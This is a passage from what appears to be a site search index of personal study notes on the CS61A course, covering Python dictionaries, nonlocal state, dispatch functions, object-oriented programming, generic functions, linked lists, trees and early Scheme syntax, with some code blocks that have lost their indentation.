an abstraction for storing and retrieving values that are indexed not by consecutive integers, but by descriptive keys.</p> <p>unordered collections of key-value pairs. cannot predict what that order will be</p> <p>iterating keys, values, and items all return iterable values.</p> <p><code>dict</code> constructor function <pre><code>&gt;&gt;&gt; dict([(3, 9), (4, 16), (5, 25)])\n{3: 9, 4: 16, 5: 25}\n</code></pre></p> <p>restrictions: - A key of a dictionary cannot be or contain a mutable value.     \u2192 Tuples are commonly used for keys in dictionaries because lists cannot be used. - There can be at most one value for a given key.</p> <pre><code>&gt;&gt;&gt; numerals.get('A', 0)\n0\n&gt;&gt;&gt; numerals.get('V', 0)\n5\n</code></pre> <p>dictionary comprehension <pre><code>{&lt;key exp&gt; : &lt;value exp&gt; for &lt;name&gt; in &lt;iter exp&gt; if &lt;filter exp&gt;}\n</code></pre> <pre><code>&gt;&gt;&gt; {x: x*x for x in range(3,6)}\n{3: 9, 4: 16, 5: 25}\n</code></pre></p>"},{"location":"cs61a%20notes/chap2/#default_mutable_argument","title":"Default Mutable Argument","text":"<pre><code>&gt;&gt;&gt; def f(s = []):  # the same object every time called\n        s.append(1)\n        return len(s)\n&gt;&gt;&gt; f()\n1\n&gt;&gt;&gt; f()\n2\n</code></pre>"},{"location":"cs61a%20notes/chap2/#local_state","title":"Local State","text":"<p>Lists and dictionaries have local state: they are changing values that have some particular contents at any point in the execution of a program.</p> <p>Functions can also have local state\uff1a nonlocal statement</p> <p><pre><code>def make_withdraw(balance):\n    \"\"\"Return a withdraw function that draws down balance with each call.\"\"\"\n    def withdraw(amount):\n        nonlocal balance\n        # Declare the name \"balance\" nonlocal\n        if amount &gt; balance:\n            return 'Insufficient funds'\n        balance = balance - amount\n        # Re-bind the existing balance name\n        return balance\n    return withdraw\n</code></pre> equivalent as: </p> <p>The nonlocal statement declares that whenever we change the binding of the name balance, the binding is changed in the first frame in which balance is already bound.</p> <p>The nonlocal statement indicates that the name appears somewhere in the environment other than the first (local) frame or the last (global) frame.</p> <p>a name outside of the first local frame can be changed by an assignment statement.</p> <p>The nonlocal statement changes all of the remaining assignment statements in the definition of withdraw.</p> <p>it will find the first frame in which balance was already defined and re-bind the name in that frame. If balance has not previously been bound to a value, then the nonlocal statement will give an error.</p> <p>By virtue of changing the binding for balance, we have changed the withdraw function as well.</p> <p>The change to balance from the first call affects the result of the second call.</p> <p>both withdraw frames have the same parent. That is, they both extend the environment for make_withdraw. Hence, they share that particular name binding. Calling withdraw has the side effect of altering the environment that will be extended by future calls to withdraw.</p> <p>assignment statements:  - created new bindings  - re-bound existing names.  - change the contents of lists and dictionaries.</p> <p>all instances of a name must refer to the same frame. <pre><code>def make_withdraw(balance):\ndef withdraw(amount):\nif amount &gt; balance:\nreturn 'Insufficient funds'\nbalance = balance - amount\nreturn balance\nreturn withdraw\n</code></pre> UnboundLocalError: local variable 'balance' referenced before assignment</p>"},{"location":"cs61a%20notes/chap2/#the_benefits_of_non-local_assignment","title":"The Benefits of Non-Local Assignment","text":"<p>If make_withdraw is called again, then it will create a separate frame with a separate binding for balance. <pre><code>wd = make_withdraw(20)\nwd2 = make_withdraw(7)\nwd2(6)\nwd(8)\n</code></pre> </p>"},{"location":"cs61a%20notes/chap2/#the_cost_of_non-local_assignment","title":"The Cost of Non-Local Assignment","text":"<p>An expression that contains only pure function calls is referentially transparent; its value does not change if we substitute one of its subexpression with the value of that subexpression.</p> <p>Re-binding operations violate the conditions of referential transparency because they do more than return a value; they change the environment.</p>"},{"location":"cs61a%20notes/chap2/#implementing_lists_and_dictionaries","title":"Implementing Lists and Dictionaries","text":"<p>a mutable list could be represented using functions with local state</p> <p>we cannot use <code>None</code> to represent an empty mutable list, because two empty lists are not identical values , but <code>None is None</code></p> <p>Dispatch functions are effectively many functions in one: the message determines the behavior of the function, and the additional arguments are used in that behavior.</p> <p><pre><code>&gt;&gt;&gt; def mutable_link():\n        \"\"\"Return a functional implementation of a mutable linked list.\"\"\"\n        contents = empty\n        def dispatch(message, value=None):\n        nonlocal contents\n        if message == 'len':\n        return len_link(contents)\n        elif message == 'getitem':\n        return getitem_link(contents, value)\n        elif message == 'push_first':\n        contents = link(value, contents)\n        elif message == 'pop_first':\n        f = first(contents)\n        contents = rest(contents)\n        return f\n        elif message == 'str':\n        return join_link(contents, \", \")\n        return dispatch\n\n&gt;&gt;&gt; def to_mutable_link(source):\n        \"\"\"Return a functional list with the same contents as source.\"\"\"\n        s = mutable_link()\n        for element in reversed(source):\n        s('push_first', element)\n        return s\n\n&gt;&gt;&gt; s = to_mutable_link(suits)\n&gt;&gt;&gt; print(s('str'))\nheart, diamond, spade, club\n&gt;&gt;&gt; s('pop_first')\n'heart'\n&gt;&gt;&gt; print(s('str'))\ndiamond, spade, club\n</code></pre> encapsulates the logic for all operations on a data value within one function that responds to different messages, is a discipline called message passing</p>"},{"location":"cs61a%20notes/chap2/#implementing_dictionaries","title":"Implementing Dictionaries","text":"<pre><code>&gt;&gt;&gt; def dictionary():\n\"\"\"Return a functional implementation of a dictionary.\"\"\"\nrecords = []\ndef getitem(key):\nmatches = [r for r in records if r[0] == key]\nif len(matches) == 1:\nkey, value = matches[0]\nreturn value\ndef setitem(key, value):\nnonlocal records\nnon_matches = [r for r in records if r[0] != key]\n\ueddb\n\ueddc\nrecords = non_matches + [[key, value]]\ndef dispatch(message, key=None, value=None):\nif message == 'getitem':\nreturn getitem(key)\nelif message == 'setitem':\nsetitem(key, value)\nreturn dispatch\n\n&gt;&gt;&gt; d = dictionary()\n&gt;&gt;&gt; d('setitem', 3, 9)\n&gt;&gt;&gt; d('setitem', 4, 16)\n&gt;&gt;&gt; d('getitem', 3)\n9\n&gt;&gt;&gt; d('getitem', 4)\n16\n</code></pre>"},{"location":"cs61a%20notes/chap2/#dispatch_dictionaries","title":"Dispatch Dictionaries","text":"<p>Instead of using conditionals to implement dispatching, we can use dictionaries with string keys.</p> <p><pre><code>1   def account(initial_balance):\n2       def deposit(amount):\n3           dispatch['balance'] += amount\n4           return dispatch['balance']\n5       def withdraw(amount):\n6           if amount &gt; dispatch['balance']:\n7               return 'Insufficient funds'\n8           dispatch['balance'] -= amount\n9           return dispatch['balance']\n10      dispatch = {'deposit':   deposit,\n11                  'withdraw':  withdraw,\n12                  'balance':   initial_balance}\n13      return dispatch\n14  \n15  def withdraw(account, amount):\n16      return account['withdraw'](amount)\n17  def deposit(account, amount):\n18      return account['deposit'](amount)\n19  def check_balance(account):\n20      return account['balance']\n21  \n22  a = account(20)\n23  deposit(a, 5)\n24  withdraw(a, 17)\n25  check_balance(a)\n</code></pre>  By storing the balance in the dispatch dictionary rather than in the account frame directly, we avoid the need for nonlocal statements in deposit and withdraw.</p>"},{"location":"cs61a%20notes/chap2/#propagating_constraints","title":"Propagating Constraints","text":"<p>combine nonlocal assignment, lists, and dictionaries to build a constraint-based system that supports computation in multiple directions</p> <p>Expressing programs as constraints is a type of declarative programming, in which a programmer declares the structure of a problem to be solved, but abstracts away the details of exactly how the solution to the problem is computed.</p> <pre><code>9 * c = 5 * (f - 32)\n</code></pre>"},{"location":"cs61a%20notes/chap2/#using_the_constraint_system","title":"Using the Constraint System","text":"<p> <pre><code>&gt;&gt;&gt; celsius = connector('Celsius')\n&gt;&gt;&gt; fahrenheit = connector('Fahrenheit')\n\n&gt;&gt;&gt; def converter(c, f):\n\"\"\"Connect c to f with constraints to convert from Celsius to Fahrenheit.\"\"\"\nu, v, w, x, y = [connector() for _ in range(5)]\nmultiplier(c, w, u)\nmultiplier(v, x, u)\nadder(v, y, f)\nconstant(w, 9)\nconstant(x, 5)\nconstant(y, 32)\n&gt;&gt;&gt; converter(celsius, fahrenheit)\n\n&gt;&gt;&gt; celsius['set_val']('user', 25)\nCelsius = 25\nFahrenheit = 77.0\n\n&gt;&gt;&gt; fahrenheit['set_val']('user', 212)\nContradiction detected: 77.0 vs 212\n\n&gt;&gt;&gt; celsius['forget']('user')\nCelsius is forgotten\nFahrenheit is forgotten\n\n&gt;&gt;&gt; fahrenheit['set_val']('user', 212)\nFahrenheit = 212\nCelsius = 100.0\n</code></pre></p>"},{"location":"cs61a%20notes/chap2/#implementing_the_constraint_system","title":"Implementing the Constraint System","text":"<p>connector'set_val' indicates that the source is requesting the connector to set its current value to value. connector'has_val' returns whether the connector already has a value. connector['val'] is the current value of the connector. connector'forget' tells the connector that the source is requesting it to forget its value. connector'connect' tells the connector to participate in a new constraint, the source. Constraints are also dictionaries, which receive information from connectors by means of two messages: constraint'new_val' indicates that some connector that is connected to the constraint has a new value. constraint'forget' indicates that some connector that is connected to the constraint has forgotten its value.</p> <pre><code>&gt;&gt;&gt; from operator import add, sub\n&gt;&gt;&gt; def adder(a, b, c):\n\"\"\"The constraint that a + b = c.\"\"\"\nreturn make_ternary_constraint(a, b, c, add, sub, sub)\n\n&gt;&gt;&gt; def make_ternary_constraint(a, b, c, ab, ca, cb):\n\"\"\"The constraint that ab(a,b)=c and ca(c,a)=b and cb(c,b) = a.\"\"\"\ndef new_value():\nav, bv, cv = [connector['has_val']() for connector in (a, b, c)]\nif av and bv:\nc['set_val'](constraint, ab(a['val'], b['val']))\nelif av and cv:\nb['set_val'](constraint, ca(c['val'], a['val']))\nelif bv and cv:\na['set_val'](constraint, cb(c['val'], b['val']))\ndef forget_value():\nfor connector in (a, b, c):\nconnector['forget'](constraint)\nconstraint = {'new_val': new_value, 'forget': forget_value}\nfor connector in (a, b, c):\nconnector['connect'](constraint)\nreturn constraint\n\n&gt;&gt;&gt; from operator import mul, truediv\n&gt;&gt;&gt; def multiplier(a, b, c):\n\"\"\"The constraint that a * b = c.\"\"\"\nreturn make_ternary_constraint(a, b, c, mul, truediv, truediv)\n\n&gt;&gt;&gt; def constant(connector, value):\n\"\"\"The constraint that connector = value.\"\"\"\nconstraint = {}\nconnector['set_val'](constraint, value)\nreturn constraint\n\n&gt;&gt;&gt; def connector(name=None):\n\"\"\"A connector between constraints.\"\"\"\ninformant = None\nconstraints = []\ndef set_value(source, value):\nnonlocal informant\nval = connector['val']\nif val is None:\ninformant, connector['val'] = source, value\nif name is not None:\nprint(name, '=', value)\ninform_all_except(source, 'new_val', constraints)\nelse:\nif val != value:\nprint('Contradiction detected:', val, 'vs', value)\ndef forget_value(source):\nnonlocal informant\nif informant == source:\ninformant, connector['val'] = None, None\nif name is not None:\nprint(name, 'is forgotten')\ninform_all_except(source, 'forget', constraints)\nconnector = {'val': None,\n'set_val': set_value,\n'forget': forget_value,\n'has_val': lambda: connector['val'] is not None,\n'connect': lambda source: constraints.append(source)}\nreturn connector\n\n&gt;&gt;&gt; def inform_all_except(source, message, constraints):\n\"\"\"Inform all constraints of the message, except source.\"\"\"\nfor c in constraints:\nif c != source:\nc[message]()\n</code></pre> <p>The dictionary called constraint / connector is a dispatch dictionary, but also the constraint object itself. It responds to the two messages that constraints receive, but is also passed as the source argument in calls to its connectors.</p> <p>forget-value, which first checks to make sure that the request is coming from the same constraint that set the value originally</p>"},{"location":"cs61a%20notes/chap2/#25_object-oriented_programming","title":"2.5 Object-Oriented Programming  <p>Like the functions in data abstraction, classes create abstraction barriers between the use and implementation of data</p>","text":""},{"location":"cs61a%20notes/chap2/#objects_and_classes","title":"Objects and Classes","text":"<ul> <li>Class: template </li> <li>Object: instance </li> </ul> <p>An attribute of an object is a name-value pair associated with the object, which is accessible via dot notation</p> <p>The attributes specific to a particular object, as opposed to all objects of a class, are called instance attributes / fields / properties / instance variables</p> <p>Functions that operate on the object or perform object-specific computations are called methods</p> <p>The return values and side effects of a method can depend upon and change other attributes of the object</p> <p>methods are invoked on a particular object</p>"},{"location":"cs61a%20notes/chap2/#defining_classes","title":"Defining Classes","text":"<p>Class names are conventionally written using the CapWords convention / CamelCase</p> <p>The method that initializes objects, <code>__init__</code> , is called the constructor for the class. <pre><code>class Account:\n    def __init__(self, account_holder):\n        self.balance = 0\n        self.holder = account_holder\n    def deposit(self, amount):\n        self.balance = self.balance + amount\n        return self.balance\n    def withdraw(self, amount):\n        if amount &gt; self.balance:\n        return 'Insufficient funds'\n        self.balance = self.balance - amount\n        return self.balance\n</code></pre> New objects that have user-defined classes are only created when a class is instantiated with call expression syntax.</p> <p>Object identity is compared using the <code>is</code> and <code>is not</code> operators.</p>"},{"location":"cs61a%20notes/chap2/#message_passing_and_dot_expressions","title":"Message Passing and Dot Expressions","text":"<p>Objects take messages using dot notation, but instead of those messages being arbitrary string-valued keys, they are names local to a class.</p> <p>named local state values (the instance attributes)</p> <p>state can be accessed and manipulated using dot notation, without having to employ nonlocal statements</p> <p>Dot expressions <pre><code>&lt;expression&gt; . &lt;name&gt;\n</code></pre> built-in function <code>getattr</code> also returns an attribute for an object by name <pre><code>getattr(spock_account, 'balance')\n</code></pre></p> <p>Methods and functions - as an attribute of a class, a method is just a function - as an attribute of an instance, it is a bound method:    couple together a function and the object on which that method will be invoked <pre><code>&gt;&gt;&gt; type(Account.deposit)\n&lt;class 'function'&gt;\n&gt;&gt;&gt; type(spock_account.deposit)\n&lt;class 'method'&gt;\n</code></pre></p> <pre><code>&gt;&gt;&gt; Account.deposit(spock_account, 1001) # as function\n# The deposit function takes 2 arguments\n1011\n&gt;&gt;&gt; spock_account.deposit(1000) # as bound method\n# The deposit method takes 1 argument\n2011\n</code></pre>"},{"location":"cs61a%20notes/chap2/#class_attributes_class_variables_static_variables","title":"Class Attributes / Class Variables / Static Variables","text":"<p>Some attribute values are shared across all objects of a given class <pre><code>class Account:\n    interest = 0.02\n# A class attribute\ndef __init__(self, account_holder):\n    self.balance = 0\n    self.holder = account_holder\n</code></pre> can still be accessed from any instance of the class. a single assignment statement to a class attribute changes the value of the attribute for all instances of the class.</p> <p>Attribute names <pre><code>&lt;expression&gt; . &lt;name&gt;\n</code></pre> To evaluate a dot expression: 1. <code>&lt;expression&gt;</code>: yields the object 2. <code>&lt;name&gt;</code>: - instance: look up instance attribute -&gt; class attribute - class: look up class attribute</p> <p>Attribute assignment - If the object is an instance, then assignment sets an instance attribute.  - If the object is a class, then assignment sets a class attribute. </p> <p>As a consequence, assignment to an attribute of an object cannot affect the attributes of its class</p> <p>If we assign to the named attribute <code>interest</code> of an account instance, we create a new instance attribute that has the same name as the existing class attribute.</p>"},{"location":"cs61a%20notes/chap2/#inheritance","title":"Inheritance","text":"<ul> <li>base class / parent class / superclass</li> <li>subclass / child class </li> </ul> <p>A subclass inherits the attributes of its base class, but may override certain attributes. </p> <p>object metaphor: - Inheritance: <code>is-a</code> relationships between classes - Composition(attribute): <code>has-a</code> relationships   eg. Bank &amp; Account</p>"},{"location":"cs61a%20notes/chap2/#using_inheritance","title":"Using Inheritance","text":"<pre><code>class CheckingAccount(Account):\n    \"\"\"A bank account that charges for withdrawals.\"\"\"\n    withdraw_charge = 1     # introduce a class attribute that is specific to the CheckingAccount class\n    interest = 0.01         # override\n    def withdraw(self, amount):     # override\n        return Account.withdraw(self, amount + self.withdraw_charge)    # call ancestor\n</code></pre> <p>name binding: - instance: instance attribute -&gt; class attribute -&gt; base class attribute - class: class attribute -&gt; base class attribute</p> <p>Calling ancestors: Attributes that have been overridden are still accessible via class objects.</p> <p>Notice that we called <code>self.withdraw_charge</code> rather than the equivalent <code>CheckingAccount.withdraw_charge</code>. benefit: a class that inherits from CheckingAccount might override the withdrawal charge. If that is the case, we would like our implementation of withdraw to find that new value instead of the old one.</p> <p>An object interface is a collection of attributes and conditions on those attributes The classes <code>Account</code> and <code>CheckingAccount</code> both implement this interface. Inheritance specifically promotes name sharing in this way</p> <p>Do not make assumptions about object types <pre><code>def deposit_all(winners, amount=5):\n    for account in winners:\n        account.deposit(amount)\n</code></pre> Assuming a particular class of account would violate the abstraction barrier of the account object abstraction <pre><code>def deposit_all(winners, amount=5):\n    for account in winners:\n        Account.deposit(account, amount)\n</code></pre> more complex example:  when a C instance is created, the <code>f</code> function in <code>__init__</code> is in class C instead of A!</p>"},{"location":"cs61a%20notes/chap2/#multiple_inheritance","title":"Multiple Inheritance","text":"<p>a subclass may inherit attributes from multiple base classes</p> <p><pre><code>class SavingsAccount(Account):\ndeposit_charge = 2\ndef deposit(self, amount):\nreturn Account.deposit(self, amount - self.deposit_charge)\n</code></pre> <pre><code>class AsSeenOnTVAccount(CheckingAccount, SavingsAccount):\ndef __init__(self, account_holder):\nself.holder = account_holder\nself.balance = 1\n</code></pre>  Python resolves names from left to right, then upwards</p>"},{"location":"cs61a%20notes/chap2/#the_role_of_objects","title":"The Role of Objects","text":"<p>Object-oriented programming is particularly well-suited to programs that model systems that have separate but interacting parts.</p> <p>On the other hand, classes may not provide the best mechanism for implementing certain abstractions.  Functional abstractions provide a more natural metaphor for representing relationships between inputs and outputs, which can also enforce a separation of concerns.</p>"},{"location":"cs61a%20notes/chap2/#26_implementing_classes_and_objects","title":"2.6 Implementing Classes and Objects","text":""},{"location":"cs61a%20notes/chap2/#27_object_abstraction","title":"2.7 Object Abstraction","text":""},{"location":"cs61a%20notes/chap2/#string_conversion","title":"String Conversion","text":"<p>all objects should produce two different string representations - <code>str</code>: human-interpretable text - <code>repr</code>: Python-interpretable expression     The result is what Python prints in an interactive session. <pre><code>&gt;&gt;&gt; from datetime import date\n&gt;&gt;&gt; tues = date(2011, 9, 12)\n&gt;&gt;&gt; repr(tues)\n'datetime.date(2011, 9, 12)'\n&gt;&gt;&gt; str(tues)   # or print(tues)\n'2011-09-12'\n</code></pre></p> <p>generic / polymorphic function can be applied to many (poly) different forms (morph) of data.</p> <p>ne way to create such a function: use a shared attribute name with a different definition in each class.</p> <p>solution in this case: the <code>repr</code> function always invokes a method called <code>__repr__</code> on its argument.  The str constructor is implemented in a similar manner <pre><code>&gt;&gt;&gt; tues.__repr__()\n'datetime.date(2011, 9, 12)'\n&gt;&gt;&gt; tues.__str__()\n'2011-09-12'\n</code></pre></p>"},{"location":"cs61a%20notes/chap2/#string_interpolation","title":"String Interpolation","text":"<p>sub-exprssions are evaluated in the current environment  the result contains the <code>str</code> string of the value of the sub-expressions</p>"},{"location":"cs61a%20notes/chap2/#special_methods","title":"Special Methods","text":"<p>certain special names are invoked by the Python interpreter in special circumstances</p>"},{"location":"cs61a%20notes/chap2/#true_and_false_values","title":"True and false values","text":"<p>By default, objects of user-defined classes are considered to be true, but the special <code>__bool__</code> method can be used to override this behavior <pre><code>&gt;&gt;&gt; Account.__bool__ = lambda self: self.balance != 0\n</code></pre></p>"},{"location":"cs61a%20notes/chap2/#sequence_operations","title":"Sequence operations","text":"<p>The len function invokes the <code>__len__</code> method <pre><code>&gt;&gt;&gt; 'Go Bears!'.__len__()\n9\n</code></pre> Python uses a sequence's length to determine its truth value, if it does not provide a <code>__bool__</code> method. Empty sequences are false, while non-empty sequences are true.</p> <p>The <code>__getitem__</code> method is invoked by the element selection operator <pre><code>&gt;&gt;&gt; 'Go Bears!'.__getitem__(3)\n'B'\n</code></pre></p>"},{"location":"cs61a%20notes/chap2/#callable_objects","title":"Callable objects","text":"<p>With <code>__call__</code> method, we can define a class that behaves like a higher-order function. <pre><code>&gt;&gt;&gt; class Adder(object):\n        def __init__(self, n):\n            self.n = n\n        def __call__(self, k):\n            return self.n + k\n&gt;&gt;&gt; add_three_obj = Adder(3)\n&gt;&gt;&gt; add_three_obj(4)\n7\n</code></pre></p>"},{"location":"cs61a%20notes/chap2/#arithmetic","title":"Arithmetic","text":"<p>to evaluate expressions that contain the + operator 1. checks for an <code>__add__</code> method on the value of the left operand, then checks for an <code>__radd__</code> method on the value of the right operand.  2. If either is found, that method is invoked with the value of the other operand as its argument.</p>"},{"location":"cs61a%20notes/chap2/#multiple_representations","title":"Multiple Representations","text":"<p>In addition to the data-abstraction barriers that isolate representation from use, we need abstraction barriers that isolate different design choices from each other and permit different choices to coexist in a single program.</p> <p>complex  - ComplexRI constructs a complex number from real and imaginary parts. - ComplexMA constructs a complex number from a magnitude and angle.</p> <p>An interface is a set of shared attribute names, along with a specification of their behavior</p> <p>these attributes must be consistent</p> <p>The Complex class implicitly defines this interface by determining how these attributes are used to add and mul complex numbers.</p> <p>Python has a simple feature for computing attributes on the fly from zero-argument functions. The <code>@property</code> decorator allows functions to be called without call expression syntax</p> <pre><code>&gt;&gt;&gt; from math import atan2\n&gt;&gt;&gt; class ComplexRI(Complex):\n        def __init__(self, real, imag):\n            self.real = real\n            self.imag = imag\n        @property\n        def magnitude(self):\n            return (self.real ** 2 + self.imag ** 2) ** 0.5\n        @property\n        def angle(self):\n            return atan2(self.imag, self.real)\n        def __repr__(self):\n            return 'ComplexRI({0:g}, {1:g})'.format(self.real, self.imag)\n</code></pre>"},{"location":"cs61a%20notes/chap2/#generic_functions","title":"Generic Functions","text":"<p>implement generic functions - interfaces and message passing - type dispatching - type coercion</p> <pre><code>&gt;&gt;&gt; from fractions import gcd\n&gt;&gt;&gt; class Rational(Number):\n        def __init__(self, numer, denom):\n            g = gcd(numer, denom)\n            self.numer = numer // g\n            self.denom = denom // g\n        def __repr__(self):\n            return 'Rational({0}, {1})'.format(self.numer, self.denom)\n        def add(self, other):\n            nx, dx = self.numer, self.denom\n            ny, dy = other.numer, other.denom\n            return Rational(nx * dy + ny * dx, dx * dy)\n        def mul(self, other):\n            numer = self.numer * other.numer\n            denom = self.denom * other.denom\n            return Rational(numer, denom)\n</code></pre>"},{"location":"cs61a%20notes/chap2/#type_dispatching","title":"type dispatching","text":"<ul> <li>built-in function <code>isinstance</code></li> <li>user-defined function <pre><code>def is_real(c):\n    \"\"\"Return whether c is a real number with no imaginary part.\"\"\"\n    if isinstance(c, ComplexRI):\n        return c.imag == 0\n    elif isinstance(c, ComplexMA):\n        return c.angle % pi == 0\n</code></pre></li> <li>give a type_tag attribute</li> </ul> <pre><code>class Number:\n    def __add__(self, other):\n        if self.type_tag == other.type_tag:\n            return self.add(other)\n        elif (self.type_tag, other.type_tag) in self.adders:\n            return self.cross_apply(other, self.adders)\n    def __mul__(self, other):\n        if self.type_tag == other.type_tag:\n            return self.mul(other)\n        elif (self.type_tag, other.type_tag) in self.multipliers:\n            return self.cross_apply(other, self.multipliers)\n    def cross_apply(self, other, cross_fns):\n        cross_fn = cross_fns[(self.type_tag, other.type_tag)]\n        return cross_fn(self, other)\n    adders = {(\"com\", \"rat\"): add_complex_and_rational,\n    (\"rat\", \"com\"): add_rational_and_complex}\n    multipliers = {(\"com\", \"rat\"): mul_complex_and_rational,\n    (\"rat\", \"com\"): mul_rational_and_complex}\n</code></pre>"},{"location":"cs61a%20notes/chap2/#type_coercion","title":"type coercion","text":"<p>Often the different data types are not completely independent, and there may be ways by which objects of one type may be viewed as being of another type. This process is called coercion</p> <pre><code>class Number:\n    def __add__(self, other):\n        x, y = self.coerce(other)\n        return x.add(y)\n    def __mul__(self, other):\n        x, y = self.coerce(other)\n        return x.mul(y)\n    def coerce(self, other):\n        if self.type_tag == other.type_tag:\n            return self, other\n        elif (self.type_tag, other.type_tag) in self.coercions:\n            return (self.coerce_to(other.type_tag), other)\n        elif (other.type_tag, self.type_tag) in self.coercions:\n            return (self, other.coerce_to(self.type_tag))\n    def coerce_to(self, other_tag):\n        coercion_fn = self.coercions[(self.type_tag, other_tag)]\n        return coercion_fn(self)\n    coercions = {('rat', 'com'): rational_to_complex}\n</code></pre> <p>may try to coerce two different types each into a third common type eg. a rhombus and a rectangle: neither is a special case of the other, but both can be viewed as quadrilaterals</p> <p>drawbacks. lose information</p>"},{"location":"cs61a%20notes/chap2/#28_efficiency","title":"2.8 Efficiency   <p>Space An environment is active if it provides the evaluation context for some expression being evaluated.  An environment becomes inactive whenever the function call for which its first frame was created finally returns.</p> <p>In general, the space required for tree-recursive functions will be proportional to the maximum depth of the tree.</p>","text":""},{"location":"cs61a%20notes/chap2/#29_recursive_objects","title":"2.9 Recursive Objects","text":""},{"location":"cs61a%20notes/chap2/#link_class","title":"Link Class","text":"<pre><code>class Link:\n    \"\"\"A linked list is either a Link object or Link.empty\n    \"\"\"\n    empty = ()\n\n    def __init__(self, first, rest=empty):\n        assert rest is Link.empty or isinstance(rest, Link)\n        self.first = first\n        self.rest = rest\n\n    def __repr__(self):\n        if self.rest:\n            rest_repr = ', ' + repr(self.rest)\n        else:\n            rest_repr = ''\n        return 'Link(' + repr(self.first) + rest_repr + ')'\n\n    def __str__(self):\n        string = '&lt;'\n        while self.rest is not Link.empty:\n            string += str(self.first) + ' '\n            self = self.rest\n        return string + str(self.first) + '&gt;'\n    def __getitem__(self, i):\n        if i == 0:\n        return self.first\n        else:\n        return self.rest[i-1]\n    def __len__(self):\n        return 1 + len(self.rest)\n</code></pre>"},{"location":"cs61a%20notes/chap2/#manipulate_link","title":"manipulate link","text":"<p>by attribute assignment </p> <p></p> <p>make clear if you want to: - modify an object   <pre><code>s.first, s.rest = ...     # attribute assignment\n...\n(return s)\n</code></pre> - construct a new object   <pre><code>if s is Link.empty:   # base case\n  return ...      \nreturn Link(s.first, ...)     # construct\n</code></pre></p>"},{"location":"cs61a%20notes/chap2/#tree_class","title":"Tree Class","text":"<pre><code>class Tree:\n    def __init__(self, label, branches=[]):\n        self.label = label\n        for branch in branches:\n            assert isinstance(branch, Tree)\n        self.branches = list(branches)\n\n    def __repr__(self):\n        if self.branches:\n            return 'Tree({0}, {1})'.format(self.label, repr(self.branches))\n        else:\n            return 'Tree({0})'.format(repr(self.label))\n\n    def is_leaf(self):\n        return not self.branches\n</code></pre>"},{"location":"cs61a%20notes/chap2/#manipulate_tree","title":"manipulate tree","text":"<p>prune subtrees <pre><code>def prune(t, x):\n    \"\"\"prune subtrees with label x\n    the root node will not be removed\"\"\"\n\n    t.branches = [b for b in t.branches if b.label != x]    # attribute assignment\n    for b in t.branches:\n        prune(b, x)\n</code></pre> delete nodes <pre><code>def delete(t, x):\n    \"\"\"Remove all nodes labeled x below the root within Tree t. When a non-leaf\n    node is deleted, the deleted node's children become children of its parent.\n\n    The root node will never be removed.\"\"\"\n\n    new_branches = []\n    for b in t.branches:\n        delete(b, x)\n        if b.label == x:\n            new_branches += b.branches\n        else:\n            new_branches.append(b)\n    t.branches = new_branches   # attribute assignment\n</code></pre></p>"},{"location":"cs61a%20notes/chap2/#sets","title":"Sets","text":""},{"location":"cs61a%20notes/chap3/","title":"Chap3","text":""},{"location":"cs61a%20notes/chap3/#chapter_3_interpreting_computer_programs","title":"Chapter 3: Interpreting Computer Programs","text":""},{"location":"cs61a%20notes/chap3/#31_introduction","title":"3.1 Introduction  <p>fundamental elements of programming: - functions - data - programs themselves - interpreter, which determines the meaning of expressions in a programming language, is just another program.</p>","text":""},{"location":"cs61a%20notes/chap3/#32_functional_programming","title":"3.2 Functional Programming  <p>Functional programming is a programming paradigm where programs are constructed by applying and composing functions. It is a declarative programming paradigm in which function definitions are trees of expressions that map values to other values, rather than a sequence of imperative statements which update the running state of the program.\" - pure functions - no re-assignment, no mutable data types - name-bindings are permanent</p> <p>adventages: - the value of expression is independent of the order in which sub-expressions are evaluated  - sub-expressions can be evaluated in parallel or lazily - referential transparent</p> <p>Scheme language uses only expressions (no statements), specializes in symbolic computation, and employs only immutable values.</p>","text":""},{"location":"cs61a%20notes/chap3/#expressions","title":"Expressions","text":"<p>exclusively uses prefix notation <pre><code>(+ (* 3\n    (+ (* 2 4)\n        (+ 3 5)))\n    (+ (- 10 7)\n        6))\n</code></pre> <pre><code>(&gt;= 2 1)\n</code></pre></p>"},{"location":"cs61a%20notes/chap3/#primitives","title":"primitives","text":"<p>Atomic expressions (also called atoms) are expressions without sub-expressions, such as numbers, boolean values, and symbols.</p>"},{"location":"cs61a%20notes/chap3/#combinations","title":"combinations","text":"<pre><code>(&lt;operator&gt; &lt;operand1&gt; &lt;operand2&gt; ...)\n</code></pre>"},{"location":"cs61a%20notes/chap3/#call_expressions","title":"call expressions","text":""},{"location":"cs61a%20notes/chap3/#special_forms","title":"special forms","text":"<p>If Expressions <pre><code>(if &lt;predicate&gt; &lt;consequent&gt; &lt;alternative&gt;)\n</code></pre></p> <p>boolean values #t (or true) and #f (or false) <pre><code>(and &lt;e1&gt; ... &lt;en&gt;)\n(or &lt;e1&gt; ... &lt;en&gt;)\n(not &lt;e&gt;)\n</code></pre> Define <pre><code>(define (&lt;name&gt; &lt;formal parameters&gt;) &lt;body&gt;)\n</code></pre> <pre><code>(define (sqrt x)\n    (define (good-enough? guess)\n        (&lt; (abs (- (square guess) x)) 0.001))\n    (define (improve guess)\n        (average guess (/ x guess)))\n    (define (sqrt-iter guess)\n        (if (good-enough? guess)\n        guess\n        (sqrt-iter (improve guess))))\n    (sqrt-iter 1.0))\n(sqrt 9)\n</code></pre> Lambda <pre><code>(lambda (&lt;formal-parameters&gt;) &lt;body&gt;)\n</code></pre> can be used as the operator in a call expression</p> <p>Cond Expressions: The cond special form can include multiple predicates (like if/elif in Python): <pre><code>(cond\n    (&lt;p1&gt; &lt;e1&gt;)\n    (&lt;p2&gt; &lt;e2&gt;)\n    ...\n    (&lt;pn&gt; &lt;en&gt;)\n    (else &lt;else-expression&gt;))\n</code></pre> Let create local bindings <pre><code>(let ((var-1 expr-1)\n      (var-2 expr-2)\n      ...\n      (var-n expr-n))\n      body-expr)\n</code></pre> <pre><code>(define (filter fn lst)\n    (if (null? lst)\n        nil\n        (let ((first (car lst))\n              (rest (cdr lst)))\n           (if (fn first)\n               (cons first (filter fn rest))\n               (filter fn rest)))))\n</code></pre></p>"},{"location":"cs61a%20notes/chap3/#compound_values","title":"Compound values","text":"<p>Pairs  created with the <code>cons</code> built-in function elements of a pair are accessed with <code>car</code> and <code>cdr</code></p> <p>Recursive lists <code>nil</code>: the empty list <pre><code>(cons 1\n    (cons 2\n        (cons 3\n            (cons 4 nil))))\n(list 1 2 3 4)\n(define one-through-four (list 1 2 3 4))\n(car one-through-four)\n1\n(cdr one-through-four)\n(2 3 